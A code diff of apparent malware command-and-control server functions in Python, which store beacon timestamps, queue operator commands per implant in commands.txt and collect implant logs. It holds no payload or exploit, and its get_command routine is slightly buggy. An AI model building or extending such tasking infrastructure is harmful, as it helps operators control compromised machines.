@@ -17,9 +17,10 @@ def add_malware(malware_entry):
 
     open(f"{directory}/logs.txt", "x")
 
-    open (f"{directory}/commands.txt", "x")
+    with open (f"{directory}/commands.txt", "w") as f:
+        f.write("This is a command written in the text file")
 
-def update_becon_malware(id, timestamp):
+def update_becon(id, timestamp):
 
     malware_json = json.loads(read_file(id,"about.txt"))
 
@@ -29,10 +30,29 @@ def update_becon_malware(id, timestamp):
 
     write_file(id, "about.txt", data)
 
-def add_log_malware(data):
+def get_command(id):
 
-    id = data['id']
-    log =  data['log']
+    file_name = f"malware/{id}/commands.txt"
+
+    with open(file_name, 'r') as fin:
+        data = fin.read().splitlines(True)
+
+    with open(file_name, 'w') as fout:
+        fout.writelines(data[1:])
+
+    return data
+
+def post_command(json):
+    id = json['id']
+    cmd = json["command"]
+
+    append_file(id,"commands.txt",cmd)
+    
+
+def add_log(json):
+
+    id = json['id']
+    log =  json['log']
 
     append_file(id,"logs.txt",log)
 
